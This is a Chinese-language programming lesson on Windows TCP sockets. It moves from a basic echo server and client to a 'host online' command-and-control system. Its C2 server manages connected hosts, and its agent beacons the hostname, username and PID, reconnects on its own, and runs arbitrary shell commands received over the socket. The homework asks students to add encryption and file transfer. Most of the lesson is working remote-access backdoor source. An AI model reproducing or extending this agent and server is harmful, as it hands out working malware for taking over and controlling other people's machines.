# 课时02：TCP套接字编程与主机上线实验

## 课程目标

1. 掌握TCP套接字的创建和使用
2. 实现TCP客户端和服务器
3. 理解TCP三次握手和四次挥手
4. 完成主机上线功能的实现

---

## 名词解释

| 术语 | 解释 |
|------|------|
| socket | 套接字，网络通信端点 |
| bind | 绑定套接字到地址和端口 |
| listen | 监听连接请求 |
| accept | 接受连接 |
| connect | 发起连接 |

---

## 使用工具

| 工具 | 用途 |
|------|------|
| Visual Studio | 编译调试 |
| Wireshark | 抓包分析 |
| netstat | 查看连接状态 |

---

## 技术原理

### TCP连接流程

```
┌─────────────────────────────────────────────────────────────┐
│                    TCP连接建立与通信                         │
│                                                             │
│     客户端                          服务器                  │
│        │                              │                     │
│        │  socket()                    │  socket()           │
│        │                              │  bind()             │
│        │                              │  listen()           │
│        │                              │     ↓               │
│        │         SYN (seq=x)          │  accept() [阻塞]    │
│        │ ──────────────────────────→ │                     │
│        │                              │                     │
│        │    SYN-ACK (seq=y, ack=x+1) │                     │
│        │ ←────────────────────────── │                     │
│        │                              │                     │
│        │       ACK (ack=y+1)          │                     │
│        │ ──────────────────────────→ │  accept() [返回]    │
│        │                              │                     │
│        │         [连接建立]            │                     │
│        │                              │                     │
│        │    send() ←──────→ recv()   │                     │
│        │    recv() ←──────→ send()   │                     │
│        │                              │                     │
│        │  closesocket()              │  closesocket()      │
│        │         FIN ────────────→   │                     │
│        │         ACK ←────────────   │                     │
│        │         FIN ←────────────   │                     │
│        │         ACK ────────────→   │                     │
└─────────────────────────────────────────────────────────────┘
```

---

## 代码实现

### 示例1：TCP服务器

```c
// TcpServer.c - TCP服务器
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_PORT 8888
#define BUFFER_SIZE 4096

int main() {
    WSADATA wsaData;
    SOCKET listenSocket = INVALID_SOCKET;
    SOCKET clientSocket = INVALID_SOCKET;
    struct sockaddr_in serverAddr, clientAddr;
    int clientAddrLen = sizeof(clientAddr);
    char recvBuffer[BUFFER_SIZE];
    int recvLen;
    
    // 初始化Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed\n");
        return 1;
    }
    
    // 创建套接字
    listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        printf("socket failed: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    
    // 设置地址重用
    int optval = 1;
    setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&optval, sizeof(optval));
    
    // 绑定地址
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;  // 监听所有接口
    serverAddr.sin_port = htons(SERVER_PORT);
    
    if (bind(listenSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("bind failed: %d\n", WSAGetLastError());
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }
    
    // 开始监听
    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
        printf("listen failed: %d\n", WSAGetLastError());
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }
    
    printf("Server listening on port %d...\n", SERVER_PORT);
    
    while (1) {
        // 接受连接
        clientSocket = accept(listenSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
        if (clientSocket == INVALID_SOCKET) {
            printf("accept failed: %d\n", WSAGetLastError());
            continue;
        }
        
        char clientIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, sizeof(clientIP));
        printf("Client connected: %s:%d\n", clientIP, ntohs(clientAddr.sin_port));
        
        // 接收和发送数据
        while (1) {
            recvLen = recv(clientSocket, recvBuffer, BUFFER_SIZE - 1, 0);
            if (recvLen > 0) {
                recvBuffer[recvLen] = '\0';
                printf("Received: %s\n", recvBuffer);
                
                // 回显
                send(clientSocket, recvBuffer, recvLen, 0);
            } else if (recvLen == 0) {
                printf("Client disconnected\n");
                break;
            } else {
                printf("recv failed: %d\n", WSAGetLastError());
                break;
            }
        }
        
        closesocket(clientSocket);
    }
    
    closesocket(listenSocket);
    WSACleanup();
    return 0;
}
```

### 示例2：TCP客户端

```c
// TcpClient.c - TCP客户端
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP   "127.0.0.1"
#define SERVER_PORT 8888
#define BUFFER_SIZE 4096

int main() {
    WSADATA wsaData;
    SOCKET clientSocket = INVALID_SOCKET;
    struct sockaddr_in serverAddr;
    char sendBuffer[BUFFER_SIZE];
    char recvBuffer[BUFFER_SIZE];
    int recvLen;
    
    // 初始化Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed\n");
        return 1;
    }
    
    // 创建套接字
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        printf("socket failed: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    
    // 服务器地址
    serverAddr.sin_family = AF_INET;
    inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);
    serverAddr.sin_port = htons(SERVER_PORT);
    
    // 连接服务器
    if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("connect failed: %d\n", WSAGetLastError());
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }
    
    printf("Connected to server %s:%d\n", SERVER_IP, SERVER_PORT);
    
    // 发送和接收数据
    while (1) {
        printf("Enter message (quit to exit): ");
        fgets(sendBuffer, BUFFER_SIZE, stdin);
        sendBuffer[strcspn(sendBuffer, "\n")] = '\0';
        
        if (strcmp(sendBuffer, "quit") == 0) {
            break;
        }
        
        // 发送数据
        if (send(clientSocket, sendBuffer, strlen(sendBuffer), 0) == SOCKET_ERROR) {
            printf("send failed: %d\n", WSAGetLastError());
            break;
        }
        
        // 接收响应
        recvLen = recv(clientSocket, recvBuffer, BUFFER_SIZE - 1, 0);
        if (recvLen > 0) {
            recvBuffer[recvLen] = '\0';
            printf("Server response: %s\n", recvBuffer);
        } else {
            printf("recv failed or server closed\n");
            break;
        }
    }
    
    closesocket(clientSocket);
    WSACleanup();
    return 0;
}
```

### 示例3：主机上线系统 - C2服务器

```c
// C2Server.c - C2服务器
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_PORT     4444
#define MAX_CLIENTS 100

typedef struct _CLIENT_INFO {
    SOCKET  Socket;
    char    IP[INET_ADDRSTRLEN];
    int     Port;
    DWORD   ClientId;
    time_t  ConnectTime;
    time_t  LastSeen;
    BOOL    Active;
} CLIENT_INFO, *PCLIENT_INFO;

CLIENT_INFO g_Clients[MAX_CLIENTS];
int g_ClientCount = 0;
DWORD g_NextClientId = 1;
CRITICAL_SECTION g_Lock;

// 添加客户端
int AddClient(SOCKET socket, struct sockaddr_in* addr) {
    EnterCriticalSection(&g_Lock);
    
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (!g_Clients[i].Active) {
            g_Clients[i].Socket = socket;
            inet_ntop(AF_INET, &addr->sin_addr, g_Clients[i].IP, sizeof(g_Clients[i].IP));
            g_Clients[i].Port = ntohs(addr->sin_port);
            g_Clients[i].ClientId = g_NextClientId++;
            g_Clients[i].ConnectTime = time(NULL);
            g_Clients[i].LastSeen = time(NULL);
            g_Clients[i].Active = TRUE;
            g_ClientCount++;
            
            LeaveCriticalSection(&g_Lock);
            return i;
        }
    }
    
    LeaveCriticalSection(&g_Lock);
    return -1;
}

// 移除客户端
void RemoveClient(int index) {
    EnterCriticalSection(&g_Lock);
    
    if (g_Clients[index].Active) {
        closesocket(g_Clients[index].Socket);
        g_Clients[index].Active = FALSE;
        g_ClientCount--;
    }
    
    LeaveCriticalSection(&g_Lock);
}

// 列出客户端
void ListClients() {
    EnterCriticalSection(&g_Lock);
    
    printf("\n=== Connected Clients ===\n");
    printf("ID\tIP Address\t\tPort\tUptime\n");
    
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (g_Clients[i].Active) {
            time_t uptime = time(NULL) - g_Clients[i].ConnectTime;
            printf("%d\t%s\t%d\t%lds\n",
                   g_Clients[i].ClientId,
                   g_Clients[i].IP,
                   g_Clients[i].Port,
                   uptime);
        }
    }
    
    printf("Total: %d clients\n\n", g_ClientCount);
    
    LeaveCriticalSection(&g_Lock);
}

// 发送命令到客户端
void SendCommand(int clientId, const char* command) {
    EnterCriticalSection(&g_Lock);
    
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (g_Clients[i].Active && g_Clients[i].ClientId == clientId) {
            send(g_Clients[i].Socket, command, strlen(command), 0);
            printf("Command sent to client %d\n", clientId);
            LeaveCriticalSection(&g_Lock);
            return;
        }
    }
    
    printf("Client %d not found\n", clientId);
    LeaveCriticalSection(&g_Lock);
}

// 客户端处理线程
DWORD WINAPI ClientHandler(LPVOID lpParam) {
    int index = (int)(INT_PTR)lpParam;
    char buffer[4096];
    int recvLen;
    
    printf("[+] Client %d handler started\n", g_Clients[index].ClientId);
    
    while (g_Clients[index].Active) {
        recvLen = recv(g_Clients[index].Socket, buffer, sizeof(buffer) - 1, 0);
        
        if (recvLen > 0) {
            buffer[recvLen] = '\0';
            g_Clients[index].LastSeen = time(NULL);
            
            printf("[Client %d] %s\n", g_Clients[index].ClientId, buffer);
        } else {
            break;
        }
    }
    
    printf("[-] Client %d disconnected\n", g_Clients[index].ClientId);
    RemoveClient(index);
    
    return 0;
}

// 接受连接线程
DWORD WINAPI AcceptThread(LPVOID lpParam) {
    SOCKET listenSocket = (SOCKET)lpParam;
    
    while (1) {
        struct sockaddr_in clientAddr;
        int clientAddrLen = sizeof(clientAddr);
        
        SOCKET clientSocket = accept(listenSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
        if (clientSocket != INVALID_SOCKET) {
            int index = AddClient(clientSocket, &clientAddr);
            if (index >= 0) {
                printf("[+] New client connected: %s:%d (ID: %d)\n",
                       g_Clients[index].IP,
                       g_Clients[index].Port,
                       g_Clients[index].ClientId);
                
                CreateThread(NULL, 0, ClientHandler, (LPVOID)(INT_PTR)index, 0, NULL);
            } else {
                closesocket(clientSocket);
                printf("[-] Max clients reached\n");
            }
        }
    }
    
    return 0;
}

int main() {
    WSADATA wsaData;
    SOCKET listenSocket;
    struct sockaddr_in serverAddr;
    
    InitializeCriticalSection(&g_Lock);
    memset(g_Clients, 0, sizeof(g_Clients));
    
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(C2_PORT);
    
    bind(listenSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(listenSocket, SOMAXCONN);
    
    printf("=== C2 Server ===\n");
    printf("Listening on port %d\n\n", C2_PORT);
    
    // 启动接受线程
    CreateThread(NULL, 0, AcceptThread, (LPVOID)listenSocket, 0, NULL);
    
    // 命令行界面
    char input[256];
    while (1) {
        printf("C2> ");
        fgets(input, sizeof(input), stdin);
        input[strcspn(input, "\n")] = '\0';
        
        if (strcmp(input, "list") == 0) {
            ListClients();
        } else if (strncmp(input, "cmd ", 4) == 0) {
            int id;
            char* cmd = strchr(input + 4, ' ');
            if (cmd && sscanf(input + 4, "%d", &id) == 1) {
                SendCommand(id, cmd + 1);
            }
        } else if (strcmp(input, "exit") == 0) {
            break;
        } else if (strlen(input) > 0) {
            printf("Commands: list, cmd <id> <command>, exit\n");
        }
    }
    
    closesocket(listenSocket);
    WSACleanup();
    DeleteCriticalSection(&g_Lock);
    
    return 0;
}
```

### 示例4：主机上线系统 - Agent客户端

```c
// C2Agent.c - C2 Agent
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_SERVER   "127.0.0.1"
#define C2_PORT     4444
#define RECONNECT_DELAY 5000

SOCKET g_Socket = INVALID_SOCKET;
BOOL g_Running = TRUE;

// 获取系统信息
void GetSystemInfo_Agent(char* buffer, int size) {
    char hostname[256];
    char username[256];
    DWORD usernameLen = sizeof(username);
    
    gethostname(hostname, sizeof(hostname));
    GetUserNameA(username, &usernameLen);
    
    sprintf_s(buffer, size, "ONLINE|%s|%s|%d",
              hostname, username, GetCurrentProcessId());
}

// 执行命令
void ExecuteCommand(const char* cmd, char* output, int outputSize) {
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) {
        strcpy_s(output, outputSize, "Failed to execute command");
        return;
    }
    
    int offset = 0;
    while (fgets(output + offset, outputSize - offset, pipe) && offset < outputSize - 1) {
        offset = strlen(output);
    }
    
    _pclose(pipe);
}

// 处理服务器命令
void ProcessCommand(const char* command) {
    char response[8192];
    
    if (strncmp(command, "shell ", 6) == 0) {
        ExecuteCommand(command + 6, response, sizeof(response));
    } else if (strcmp(command, "sysinfo") == 0) {
        GetSystemInfo_Agent(response, sizeof(response));
    } else if (strcmp(command, "exit") == 0) {
        g_Running = FALSE;
        strcpy_s(response, sizeof(response), "Agent exiting");
    } else {
        strcpy_s(response, sizeof(response), "Unknown command");
    }
    
    send(g_Socket, response, strlen(response), 0);
}

// 连接服务器
BOOL ConnectToServer() {
    struct sockaddr_in serverAddr;
    
    g_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_Socket == INVALID_SOCKET) {
        return FALSE;
    }
    
    serverAddr.sin_family = AF_INET;
    inet_pton(AF_INET, C2_SERVER, &serverAddr.sin_addr);
    serverAddr.sin_port = htons(C2_PORT);
    
    if (connect(g_Socket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(g_Socket);
        g_Socket = INVALID_SOCKET;
        return FALSE;
    }
    
    // 发送上线信息
    char info[256];
    GetSystemInfo_Agent(info, sizeof(info));
    send(g_Socket, info, strlen(info), 0);
    
    return TRUE;
}

// 主循环
void MainLoop() {
    char buffer[4096];
    int recvLen;
    
    while (g_Running) {
        // 尝试连接
        if (g_Socket == INVALID_SOCKET) {
            if (!ConnectToServer()) {
                Sleep(RECONNECT_DELAY);
                continue;
            }
        }
        
        // 接收命令
        recvLen = recv(g_Socket, buffer, sizeof(buffer) - 1, 0);
        if (recvLen > 0) {
            buffer[recvLen] = '\0';
            ProcessCommand(buffer);
        } else {
            closesocket(g_Socket);
            g_Socket = INVALID_SOCKET;
        }
    }
}

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    MainLoop();
    
    if (g_Socket != INVALID_SOCKET) {
        closesocket(g_Socket);
    }
    
    WSACleanup();
    return 0;
}
```

---

## 课后作业

1. 为C2系统添加心跳机制
2. 实现多线程并发处理
3. 添加数据加密功能
4. 实现文件上传下载功能

---

## 扩展阅读

- TCP/IP详解
- Winsock高级编程
- C2框架设计模式
